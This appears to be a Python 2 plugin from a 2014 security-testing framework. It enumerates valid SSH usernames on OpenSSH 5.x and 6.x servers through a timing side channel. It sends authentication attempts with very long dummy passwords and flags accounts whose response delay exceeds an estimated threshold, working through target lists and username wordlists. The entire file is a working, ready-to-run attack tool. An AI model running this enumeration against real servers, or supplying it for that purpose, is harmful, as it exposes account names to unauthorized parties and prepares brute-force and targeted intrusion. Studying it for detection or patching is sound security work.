#!/usr/bin/python

# Copyright (c) 2014, curesec GmbH
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of
# conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list
# of conditions and the following disclaimer in the documentation and/or other materials
# provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used
# to endorse or promote products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
import paramiko
import socket
import random
import string
import argparse
from datetime import datetime
from ctools import cUtil
import __builtin__
import itertools as it
import sys
import re
import ccdClasses as ccd
from ctools import cTuples

__plgname__ = 'ssh_user_enum'

import logging
LOG = "/tmp/" + __plgname__ + ".log"
FORMAT = '%(asctime)s - %(name)s - ' + \
    '%(levelname)s - %(threadName)s - %(message)s'
logging.basicConfig(filename=LOG,
                    filemode="w",
                    format=FORMAT,
                    level=logging.DEBUG)
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

N_SAMPLES = 10
MAX_RETRIES = 3


def est_delay(target):
    res = 0.0
    #pw = 'a' * pwlen
    for _ in range(N_SAMPLES):
        user = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
        logger.info('User: ' + user)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        p = None
        try:
            s.connect(target)
            p = paramiko.Transport(s)
            #p.local_version = cUtil.ssh_version.next()
        except Exception, e:
            logger.warning(e)
            s.close()
            break
        try:
            p.connect(username=user)
        except Exception, e:
            logger.warning(e)
            s.close()
            break
        start = datetime.now()
        try:
            p.auth_password(user, test_user.pw)
        except paramiko.AuthenticationException, e:
            pass
        except Exception, e:
            logger.warning(e)
            s.close()
            break
        stop = cUtil.secs(start)
        res += stop / N_SAMPLES
    logger.info('estimated dealy for %s: %f' % (target, res))
    return res


def get_banner(target):
    s = socket.socket()
    banner = ''
    try:
        s.connect(target)
        banner = s.recv(1024)
    except Exception, e:
        logger.warning(e)
    finally:
        s.close()
    return banner.strip()


def check_version(banner):
    r = re.compile('openssh.(5|6)\.\d+', re.IGNORECASE)
    return r.search(banner)


def test_user(target, delay, user):  # target, u, delay, pwlen):
    logger.info('testing delay for user %s' % user)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    p = None
    try:
        s.connect(target)
        logger.info('connected to ' + repr(target))
        p = paramiko.Transport(s)
        #p.local_version = cUtil.ssh_version.next()
        p.connect(username=user)
        start = datetime.now()
        try:
            p.auth_password(user, test_user.pw)
        except:
            pass
        stop = cUtil.secs(start)
        logger.info('Delay for user %s: %f' % (user, stop))
        return stop
    except Exception, e:
        logger.warning(e)
        raise
    finally:
        if p:
            p.close()


def prep_targets(args):
    logger.info('prep ' + repr(args))
    target = args
    banner = 'No Banner'
    delay = 0.0
    banner_check = False
    try:
        banner = get_banner(target)
        if not banner or prep_targets.bignore or check_version(banner):
            delay = est_delay(target)
            banner_check = True
    except Exception, e:
        logger.warning(e)
        return None
    return (banner_check, target, delay, banner)


class SshUserEnum(object):
    def __init__(self, args, dbh=None):
        opt = parse(args)
        self.dbh = dbh

        self.adj = opt.adj

        # We don't really need this module here, because we do not operate
        # multithreaded, however it is convenient to use the mkIP2 and isUp
        # functions to preprocess the target ips
        self.ig_targets = cTuples.cInputGenerator(data=opt.targets,
                                                  filename=opt.target_fn,
                                                  circle=False,
                                                  #prepare_cb=cUtil.isUp,
                                                  expand_cb=lambda t: cUtil.mkIP2(t,
                                                                                  ports=[opt.port],
                                                                                  #noResolve=True
                                                                                  ),
                                                  )
        self.ig_targets.start()

        # we don't want to overload the server with too many parallel login
        # attempts as it might influence the delay times
        # so anyway thats why i use one seperate list of user names per server
        # instaed of zipping them to the targets
        if opt.U:
            self.users = it.chain(__builtin__.openany(opt.U, 'r').readlines(), opt.u)
        elif opt.u:
            self.users = opt.u
        else:
            self.users = it.chain(__builtin__.openshared('usernames.log', 'r').readlines())
        prep_targets.bignore = opt.bignore
        test_user.pw = 'a' * opt.l

    def start(self):
        print 'SSH User Enum started'
        start = datetime.now()
        for target, fqdn_tuple in self.ig_targets:
            if not isinstance(target, str):
                ip = target[0]
                port = int(target[1])
                if fqdn_tuple:
                    fqdn = ''.join(fqdn_tuple)
                else:
                    fqdn = ''
            else:
                ip = target
                port = int(fqdn_tuple)
                fqdn = ''

            target = (ip, port)

            res = prep_targets((ip, port))
            banner_check, _, delay_est, banner = res
            delay = delay_est * self.adj
            delay_est2 = delay_est * (self.adj * 0.25)
            print '-' * 80
            print '[+] Target:\t\t%s:%d (%s)' % (ip, port, fqdn)
            print '[+] Banner:\t\t%s' % banner
            print '[+] Est. Delay:\t\t%f' % delay_est
            print '[+] Delay Thresh:\t%f, %f' % (delay, delay_est2)
            print '-' * 80
            if not banner_check:
                print '[-] Banner check failed, rerun with -bignore'
            else:
                for u in self.users:
                    u = u.rstrip()
                    if not u:
                        continue
                    udelay = None
                    # 3 retries max
                    for _ in range(MAX_RETRIES):
                        try:
                            udelay = test_user(target, delay, u)
                            break
                        except Exception, e:
                            logger.warning(e)
                    if udelay and udelay > delay:
                        print '\033[91m[+] Found %s (%f)\033[0m' % (u, udelay)
                        if self.dbh:
                            sue = ccd.SshUserEnumResult(
                                ip=ip,
                                #fqdn=fqdn,
                                port=port,
                                user=u
                            )
                            self.dbh.add(sue)
                    elif udelay and udelay > delay_est2:
                        print '\033[93m[?] Maybe %s (%f)\033[0m' % (u, udelay)
                    else:
                        if not udelay:
                            udelay = 0.0
                        print '[-] Discard %s (%f)' % (u, udelay)

        print '-' * 80
        print 'Finished in %f seconds' % cUtil.secs(start)


def parse(args):
    parser = argparse.ArgumentParser(
        prog=__plgname__,
        description='Bruteforce ssh user names, using the method described in TODO'
    )
    parser.add_argument('-T',
                        help='files containing host:port entries',
                        default='',
                        dest='target_fn'
                        )
    parser.add_argument('-t',
                        help='target hosts',
                        default=[],
                        nargs='+',
                        dest='targets',
                        )
    parser.add_argument('-a',
                        help='Float adjustment for delay threshold (default: delay * 10.0)',
                        dest='adj',
                        type=float,
                        default=10.0
                        )
    parser.add_argument('-port',
                        help='target port (default 22)',
                        dest='port',
                        default=22,
                        type=int
                        )
    parser.add_argument('-to',
                        help='Server timeout (default 3s)',
                        dest='to',
                        type=int,
                        default=3
                        )

    parser.add_argument('-u', help='users', nargs='+', default=[])
    parser.add_argument('-U', help='users filename')
    parser.add_argument('-l', help='Password length (default 40000)', type=int, default=40000)
    parser.add_argument('-bignore', help='Ignore ssh banner', action='store_true')
    if not args:
        parser.print_help()
        sys.exit(0)
    opt = parser.parse_args(args)
    return opt
